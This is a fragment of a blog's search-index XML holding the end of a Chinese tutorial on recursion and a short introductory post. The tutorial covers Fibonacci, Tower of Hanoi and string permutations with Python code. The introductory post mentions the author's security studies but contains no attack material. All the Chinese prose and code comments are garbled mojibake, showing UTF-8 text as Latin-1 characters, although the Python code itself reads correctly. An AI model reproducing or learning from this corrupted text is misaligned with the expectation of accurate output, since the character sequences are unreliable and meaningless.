alt="img"></p><p>å…ˆç¡®å®šå‡½æ•°çš„å‚æ•°ã€è¿”å›å€¼ï¼Œæ±‚ç¬¬né¡¹çš„å€¼ï¼Œåˆ™næ¯«æ— ç–‘é—®æ˜¯å‚æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> s <span class="hljs-comment"># å‡è®¾sæ˜¯ç¬¬né¡¹çš„å€¼</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼Œå·²çŸ¥n=1æˆ–è€…n=2æ—¶ï¼Œå…¶å€¼ä¸º1ï¼Œåˆ™å¯ä»¥ç¡®å®šå½“n=1æˆ–è€…n=2æ—¶é€’å½’å°±å¯ä»¥ç»“æŸäº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s<span class="hljs-comment"># å‡è®¾sæ˜¯ç¬¬né¡¹çš„å€¼</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚å‡½æ•°çš„é€»è¾‘ï¼Œå…ˆå‡è®¾n=3ï¼Œåˆ™ç¬¬ä¸‰é¡¹çš„å€¼<code>f(3)=f(2)+f(1)</code>ï¼Œä¹Ÿå°±ç›¸å½“äº<code>f(n)=f(n-1)+f(n-2)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">elif</span>(n==<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> f(n-<span class="hljs-number">1</span>)+f(n-<span class="hljs-number">2</span>)<span class="hljs-comment"># å®Œå·¥</span><br></code></pre></td></tr></table></figure><h4 id="ä¸¾ä¾‹-3-æ±‰è¯ºå¡”"><a href="#ä¸¾ä¾‹-3-æ±‰è¯ºå¡”" class="headerlink" title="ä¸¾ä¾‹ 3 æ±‰è¯ºå¡”"></a>ä¸¾ä¾‹ 3 æ±‰è¯ºå¡”</h4><p>æ±‚æ±‰è¯ºå¡”çš„æŒªåŠ¨é¡ºåº(ä¸æ˜¯éœ€è¦æŒªåŠ¨çš„æ¬¡æ•°)</p><p>å…·ä½“ç©æ³•è¿™å°±ä¸å•°å—¦äº†ï¼Œåæ­£å°±æ˜¯æŠŠä¸€å †åœ†ç‰‡ç‰‡ä»ä¸€ä¸ªæŸ±å­ä¸Šé¢æŒªåˆ°å¦å¤–ä¸€ä¸ªæŸ±å­ä¸Šé¢ï¼Œå”¯ä¸€çš„è¦æ±‚å°±æ˜¯å°çš„è¦åœ¨å¤§çš„ä¸Šé¢ã€‚</p><p>å‡è®¾åœ†ç‰‡ç‰‡çš„æ•°é‡ä¸ºn,åˆ™å½“n=1æ—¶ï¼Œå¯ä»¥ç›´æ¥å°†Aç§»åŠ¨åˆ°CæŸ±ä¸Šï¼Œ</p><p><img src="/2022/01/22/recursion/tower1.gif"></p><p>å½“n=2æ—¶ï¼Œå…·ä½“æŒªåŠ¨çŠ¶æ€å¦‚ä¸‹:</p><p>A â€“&gt; B</p><p>A â€“&gt; C</p><p>B â€“&gt; C</p><p><img src="/2022/01/22/recursion/tower2.gif"></p><p>å½“n=3æ—¶</p><p>A â€“&gt; C</p><p>A â€“&gt; B</p><p>C â€“&gt; B</p><p>A â€“&gt; C</p><p>B â€“&gt; A</p><p>B â€“&gt; C</p><p>A â€“&gt; C</p><p><img src="/2022/01/22/recursion/tower3.gif"></p><p>ä¸éš¾çœ‹å‡ºï¼Œå½“n=2æ—¶ï¼Œä¸»è¦å°±æ˜¯åˆ†ä¸‰æ­¥(å¯¹åœ†ç‰‡è¿›è¡Œæ ‡å·ï¼Œä»ä¸‹å¾€ä¸Šï¼ŒN-&gt;1)</p><p>1ã€1(N-1)å·åœ†ç‰‡ä»èµ·å§‹ä½ç½®ç§»åŠ¨åˆ°ç¼“å†²åŒº</p><p>2ã€å°†2(N)å·åœ†ç‰‡ä»èµ·å§‹ä½ç½®ç§»åŠ¨åˆ°ç»ˆç‚¹</p><p>3ã€æœ€åå°†1(N-1)å·åœ†ç‰‡ä»ç¼“å†²åŒºç§»åŠ¨åˆ°ç»ˆç‚¹</p><p>å½“ç„¶ï¼Œåœ¨åœ†ç‰‡æ•°é‡è¾ƒå¤šæ—¶çš„èµ·å§‹ä½ç½®ï¼Œç»ˆç‚¹ä¸ç¼“å†²åŒºæ˜¯ç›¸å¯¹çš„ï¼Œå¹¶ä¸æ˜¯æŒ‡å®šçš„æŸä¸€ä¸ªæŸ±å­ï¼Œå› ä¸ºéœ€è¦ä¸åœçš„äº¤æ¢ä½ç½®ï¼Œæ‰€ä»¥èµ·å§‹ä½ç½®ã€ç¼“å†²åŒºä¸ç»ˆç‚¹å¯ä»¥æ˜¯ä»»ä½•ä¸€ä¸ªæŸ±å­ã€‚</p><p>å…ˆå‡è®¾åªæœ‰ä¸¤ä¸ªåœ†ç‰‡ï¼Œä¹Ÿå°±æ˜¯n=2(è¦å…ˆå°†æœ€å°å­é—®é¢˜æ±‚å‡º)æŒ‰ç…§é€’å½’ä¸‰æ­¥ï¼Œé¦–å…ˆç¡®å®šå‚æ•°ä»¥åŠè¿”å›å€¼ï¼Œnä¸ªåœ†ç‰‡(n)ï¼Œèµ·å§‹æŸ±å­(A)ï¼Œç¼“å†²æŸ±å­(B)ï¼Œç»ˆæ­¢ä½ç½®(C)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åœ†ç‰‡çš„å˜åŠ¨æƒ…å†µ&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç¡®å®šç»ˆæ­¢æ¡ä»¶ï¼Œå·²çŸ¥å½“åªæœ‰ä¸€ä¸ªåœ†ç‰‡æ—¶ï¼Œå¯ä»¥ç›´æ¥ä»èµ·å§‹ä½ç½®ç›´æ¥åˆ°ç»ˆæ­¢ä½ç½®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;åœ†ç‰‡çš„å˜åŠ¨æƒ…å†µ&quot;</span>)<br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚å¾ªç¯çš„é€»è¾‘ï¼Œå•å±‚çš„é€»è¾‘åœ¨ä¸Šé¢å·²ç»å†™æ¸…æ¥šï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å†™å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># n = 2çš„æƒ…å†µä¸‹</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+B)<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>        <span class="hljs-built_in">print</span>(B +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br></code></pre></td></tr></table></figure><p>è€Œå½“n=3æ—¶ï¼Œå°±è¦ç»§ç»­è°ƒç”¨tower()è¿›è¡Œæ’åˆ—ï¼Œæ‰€ä»¥å¯ä»¥å†™æˆå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å†å‡è®¾n = 3çš„æƒ…å†µä¸‹</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tower</span>(<span class="hljs-params">n,A,B,C</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<br>    <span class="hljs-keyword">else</span>:<br>        tower(n-<span class="hljs-number">1</span>,A,C,B) <span class="hljs-comment">#å› ä¸ºç°åœ¨æ˜¯å°†åœ†ç‰‡ä»Aç§»åŠ¨åˆ°Bï¼Œæ‰€ä»¥Bå’ŒCè°ƒæ¢ä½ç½®</span><br>        <span class="hljs-built_in">print</span>(A +<span class="hljs-string">&quot; --&gt; &quot;</span>+C)<span class="hljs-comment"># å¯ä»¥å‡è®¾1å·åœ†ç‰‡ä¸Šé¢çš„æŸ±å­éƒ½å·²ç»ç§»åŠ¨åˆ°äº†ç¼“å†²åŒºï¼Œåˆ™å¯ä»¥ç›´æ¥A-&gt;C</span><br>        tower(n-<span class="hljs-number">1</span>,B,A,C) <span class="hljs-comment"># ç°åœ¨å°†ç¼“å†²åŒºä¸Šçš„åœ†ç‰‡ç§»åŠ¨è‡³ç»ˆç‚¹</span><br></code></pre></td></tr></table></figure><p>n&gt;1çš„å…¶ä»–æƒ…å†µåŒç†</p><h4 id="ä¸¾ä¾‹4-å­—ç¬¦ä¸²çš„å…¨æ’åˆ—"><a href="#ä¸¾ä¾‹4-å­—ç¬¦ä¸²çš„å…¨æ’åˆ—" class="headerlink" title="ä¸¾ä¾‹4 å­—ç¬¦ä¸²çš„å…¨æ’åˆ—"></a>ä¸¾ä¾‹4 å­—ç¬¦ä¸²çš„å…¨æ’åˆ—</h4><p>å°±æ˜¯å°†å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å­—ç¬¦è¿›è¡Œæ’åˆ—ç»„åˆï¼Œå¾—åˆ°æ‰€æœ‰çš„æ’åˆ—ç»„åˆç»“æœï¼Œå¹¶å»é‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä¾‹é¢˜</span><br><span class="hljs-comment"># é¢˜ç›®æ¥æºï¼šcodewars.Permutations</span><br>permutations(<span class="hljs-string">&#x27;a&#x27;</span>); <span class="hljs-comment"># [&#x27;a&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;ab&#x27;</span>); <span class="hljs-comment"># [&#x27;ab&#x27;, &#x27;ba&#x27;]</span><br>permutations(<span class="hljs-string">&#x27;aabb&#x27;</span>); <span class="hljs-comment"># [&#x27;aabb&#x27;, &#x27;abab&#x27;, &#x27;abba&#x27;, &#x27;baab&#x27;, &#x27;baba&#x27;, &#x27;bbaa&#x27;]</span><br></code></pre></td></tr></table></figure><p>é¢˜ç›®çš„æ„æ€å¾ˆå¥½ç†è§£ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä¸Šé€’å½’</p><p>ç¡®å®šé€’å½’çš„å‚æ•°åŠè¿”å›å€¼ï¼Œæ˜¯å¯¹å­—ç¬¦ä¸²çš„å…¨æ’åˆ—ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²ä¸€å®šæ˜¯å‚æ•°ï¼Œè¿”å›å€¼åˆ™æ˜¯æ’åˆ—ç»„åˆçš„ç»“æœï¼Œå¹¶ä¸”è¦å»é‡ï¼Œåˆ™å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„åœ¨åŠ ä¸Šset()å»é‡å³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>ç¡®å®šé€’å½’çš„ç»“æŸç‚¹ï¼Œç”±ä¾‹å­å¯çŸ¥ï¼Œå½“å­—ç¬¦ä¸²ä¸­åªæœ‰ä¸€ä¸ªå­—æ¯æ—¶ï¼Œç»“æœåªæœ‰ä¸€ä¸ª(å®ƒè‡ªå·±æœ¬èº«)ï¼Œæ­¤æ—¶å¯ä»¥ç›´æ¥è¿”å›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>ç¡®å®šå•å±‚é€’å½’é€»è¾‘ï¼Œå¯ä»¥å…ˆå‡è®¾å­—ç¬¦ä¸²ä¸ºâ€abâ€,è¿™ä¸ªç®—æ˜¯å…¨æ’åˆ—ä¸­æœ€å°å­é—®é¢˜äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å­—ç¬¦ä¸²é•¿åº¦ä¸º2æ—¶</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = [] <span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string[:i]+string[i+<span class="hljs-number">1</span>:]: <span class="hljs-comment"># å…¨æ’åˆ—çš„æƒ…å†µä¸‹,ä¸èƒ½ä¸è‡ªèº«è¿›è¡Œæ’åˆ—ç»„åˆ</span><br>            <span class="hljs-comment"># ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨&quot;ab&quot;çš„æƒ…å†µä¸‹ï¼Œé€‰å–&quot;a&quot;ä¹‹åå°±ä¸èƒ½å†é€‰å–äº†ï¼Œå½“ç„¶&quot;aab&quot;çš„æƒ…å†µä¸‹ï¼Œaå¯ä»¥å‡ºç°ä¸¤æ¬¡</span><br>            result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><p>è€Œå½“å­—ç¬¦ä¸²çš„é•¿åº¦å¤§äº2æ—¶ï¼Œåªéœ€è¦åœ¨ç¬¬äºŒä¸ªforå¾ªç¯å¤„å†æ¬¡è°ƒç”¨<code>permutations()</code>,ä½¿å¾—å…¶å¯¹å½“å‰å­—ç¬¦ä¸²é•¿åº¦å°ç§»ä½çš„å­—ç¬¦ä¸²è¿›è¡Œæ’åˆ—ç»„åˆï¼Œç„¶åè¿”å›ç»™ j ï¼Œå†ä¸<code>string[i]</code>è¿›è¡Œæ‹¼æ¥ï¼Œæ‰€ä»¥ç¨‹åºå¯ä»¥å†™æˆå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">permutations</span>(<span class="hljs-params">string</span>):</span><br>    result = []<span class="hljs-comment"># å­˜æ”¾æ’åˆ—ç»„åˆçš„ç»“æœ</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(string)==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> string<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(string)):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> permutations(string[<span class="hljs-number">0</span>:i]+string[i+<span class="hljs-number">1</span>:]):<br>                result.append(string[i]+j)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(result)<br></code></pre></td></tr></table></figure><h3 id="End"><a href="#End" class="headerlink" title="End"></a>End</h3><p>æœ¬æ–‡å¯èƒ½ä¼šæœ‰å†™é”™çš„åœ°æ–¹ï¼Œè¯·è§è°…ï¼Œæˆ‘åªæ˜¯ä¸ªæ¡åƒåœ¾ï¼Œè¦æ˜¯æœ‰å¥½å¿ƒçš„å¤§å“¥æ„¿æ„æŒ‡å‡ºé”™è¯¯çš„åœ°æ–¹ï¼Œæˆ‘ä¼šå°½å¿«è¿›è¡Œä¿®æ”¹ï¼Œå…ˆæ„Ÿè°¢å¤§å“¥~</p><h3 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h3><blockquote><p><a href="https://zhuanlan.zhihu.com/p/94748605">https://zhuanlan.zhihu.com/p/94748605</a></p><p><a href="https://www.zhihu.com/question/24385418">https://www.zhihu.com/question/24385418</a></p><p><a href="https://blog.csdn.net/u011562123/article/details/81984470">https://blog.csdn.net/u011562123/article/details/81984470</a></p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>å­¦ä¹ é€’å½’çš„ä¸€äº›è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello</title>
    <link href="/2022/01/20/hello/"/>
    <url>/2022/01/20/hello/</url>
    
    <content type="html"><![CDATA[<p>æŒ‰ç…§æƒ¯ä¾‹ï¼Œåšå®¢ç¬¬ä¸€ç¯‡æ–‡ç« æ€»è¦è¯´è®²ä¸€äº›å¥‡å¥‡æ€ªæ€ªçš„è¯</p><p>å¾ˆæ—©ä¹‹å‰å°±æœ‰æ­å»ºåšå®¢çš„æƒ³æ³•ï¼Œä¹Ÿè¯•è¿‡ï¼Œä½†ä¸»è¦æ˜¯è‹¦äºæ²¡æœ‰ä»€ä¹ˆæ–‡ç« å¯å‘ï¼Œç°åœ¨æƒ³æƒ³å…¶å®æ˜¯å­¦åˆ°äº†ä»€ä¹ˆå°±å‘ä»€ä¹ˆï¼Œå†™çš„å¥½ä¸å¥½å…¶å®ä¹Ÿä¸æ˜¯é‚£ä¹ˆé‡è¦ï¼Œå½“ç„¶ï¼Œèƒ½å†™å¥½çš„åšå®¢æ˜¯æœ€å¥½çš„å•¦ã€‚è¿™æ¬¡æ­å»ºåšå®¢å¯èƒ½ä¹Ÿæ˜¯ä¸€æ—¶å…´èµ·ï¼Œä½†å¸Œæœ›æˆ‘ä»¥åèƒ½å¤ŸåšæŒä¸‹å»ï¼Œåœ¨æ­¤ä¹Ÿç«‹ä¸ª<code>flag</code> : <strong>æ¯å‘¨æ›´æ–°ä¸€ç¯‡åšå®¢</strong></p><p>æ­åšå®¢æ˜¯ç”¨çš„<code>github</code>+<code>hexo</code>ï¼Œä¸¤ä¸ªåŸå› ï¼Œä¸€ä¸ªæ²¡ç¥¨å­ï¼Œå¦ä¸€ä¸ªå›¾çœäº‹ï¼Œè¯´ç™½äº†å°±æ˜¯åˆæ‡’åˆæƒ³ç™½å«–(å¼€æºç²¾ç¥)</p><p>å­¦å®‰å…¨ä¹Ÿæ–­æ–­ç»­ç»­çš„å¾ˆé•¿æ—¶é—´äº†ï¼Œæ€»æ˜¯ç©ç€ç©ç€å­¦ä¸€ç‚¹ç‚¹çš„ï¼Œåˆ°å¤´æ¥ä¸€äº‹æ— æˆï¼Œæ‰¾ä¸ªå·¥ä½œéƒ½å¾ˆè´¹åŠ²ï¼Œå¦‚æœæœ‰äººçœ‹åˆ°äº†ï¼Œè¿˜è¯·æ¿€åŠ±è‡ªå·±è¦åšæŒä¸‹å»ï¼Œç©å¾ˆé‡è¦ï¼Œä½†å­¦ä¹ æ›´é‡è¦ã€‚å‡å¦‚å½“åˆå¥½å¥½å­¦ä¹ ï¼Œç°åœ¨ä¹Ÿä¸è‡³äºæ··åˆ°å»æ¡åƒåœ¾ï¼Œä½†æ˜¯æ²¡æœ‰å‡å¦‚ï¼Œæ²¡æœ‰å‡å¦‚ï¼æ²¡ä»€ä¹ˆæ˜¯èƒ½å¤Ÿä¸åŠ³è€Œè·çš„ï¼Œå½“ç„¶ï¼Œè¦æ˜¯ç‰¹æ®Šæƒ…å†µå¦ç®—ï¼Œå¯¹äºåƒæˆ‘è¿™æ ·çš„æ™®é€šäººæ¥è¯´ï¼Œæƒ³è¦è·å¾—ï¼Œå°±è¦ä»˜å‡ºï¼Œå¯èƒ½ä»˜å‡ºå¾ˆå¤šå´åªèƒ½æ”¶è·ä¸€ç‚¹ç‚¹ï¼Œä½†æ€»æ¯”æ²¡æœ‰å¼ºå“ˆã€‚è¯´å®è¯ï¼Œå®‰å…¨è¿™ä¸ªæˆ‘å¾ˆæ€•ä»¥åä¼šåƒä¸ä¸Šé¥­ï¼Œ30å²ä¹‹åå§ï¼Œæ‹…å¿ƒä¼šåƒä¸ä¸Šé¥­ã€‚æ¡åƒåœ¾çš„æˆ‘æŠ€æœ¯å¾ˆåƒåœ¾ï¼Œå£æ‰ä¹Ÿä¸è¡Œï¼Œä¸ºäººå¤„ä¸–ä¹Ÿä¸€èˆ¬èˆ¬ï¼Œæ„Ÿè§‰è‡ªå·±æ··ä¸æˆé¢†å¯¼ï¼Œæ‰€ä»¥å°±å¾ˆæ€•å¾ˆæ€•ã€‚å½“ç„¶åƒä¸ä¸Šé¥­å¯èƒ½æœ‰ç‚¹å¤¸å¼ ï¼Œä½†ç¡®å®æ˜¯æœ‰ä¸€å®šå¯èƒ½çš„ã€‚</p><p>å…¶å®æ­å»ºåšå®¢ä¹Ÿæœ‰å¥½å¤„ï¼Œç®€å•ç‚¹è¯´ï¼ŒæŠŠè‡ªå·±ç†è§£æˆ–è€…å­¦ä¹ çš„ä¸œè¥¿è¡¨è¾¾å‡ºæ¥ï¼Œè¿™åœ¨æˆ‘çœ‹æ¥æ˜¯æ¯”è‡ªå·±å­¦çš„æ›´éš¾ä¸€äº›ï¼Œä½†æ˜¯åœ¨å†™åšå®¢çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå‘ç°è‡ªå·±ä»¥å‰ä¼¼æ‡‚éæ‡‚çš„åœ°æ–¹å¯èƒ½ä¼šé€æ¸æ¸…æ™°(è¿™ä¹Ÿæ˜¯æˆ‘è¿™å‡ å¤©åœ¨å†™ä¸‹ä¸€ç¯‡åšå®¢æ—¶çš„ä½“ä¼š)ã€‚</p><p>æ‰¯äº†ä¸€äº›åºŸè¯ï¼Œä¹Ÿèƒ½çœ‹ï¼Œä¹Ÿä¸èƒ½çœ‹ï¼Œæ°´ä¸€ä¸‹ï¼Œé¡ºé“æµ‹è¯•ä¸€ä¸‹åšå®¢èƒ½ä¸èƒ½ç”¨ï¼</p><p>å¦‚æœä½ çœ‹åˆ°äº†è¿™äº›åºŸè¯ï¼Œå¹¶ä¸”çœ‹çœ‹ä¹Ÿæ— å¦¨ï¼Œä½†è¯·åˆ«å–·æˆ‘ï¼Œè°¢è°¢å•¦~</p><p>æœ€åå†é™„å¼ å›¾ç‰‡å§ï¼Œä¹Ÿé™„ä¸Šä¸€å¥å°è¯</p><blockquote><p>åˆˆé™¤æ‚è‰ æ‰æœ‰æ–°ç”Ÿ</p></blockquote><p><img src="/2022/01/20/hello/hello.jfif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ä¸€äº›åºŸè¯å§</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
